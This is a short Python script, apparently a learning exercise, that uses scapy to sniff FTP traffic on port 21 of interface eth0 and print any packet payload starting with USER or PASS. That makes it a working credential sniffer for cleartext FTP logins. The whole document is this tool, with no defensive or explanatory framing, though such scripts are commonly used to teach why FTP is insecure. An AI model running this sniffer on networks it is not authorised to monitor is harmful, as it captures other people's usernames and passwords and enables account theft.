#!/usr/bin/python3

from scapy.all import *

def on_packet(paket):
	if "Raw" in paket:
		contents = str(paket["Raw"].load, encoding="utf-8")
		if contents.startswith("PASS") or contents.startswith("USER"):
			print(contents)


sniff(iface="eth0", filter="tcp and port 21", prn=on_packet, store = 0)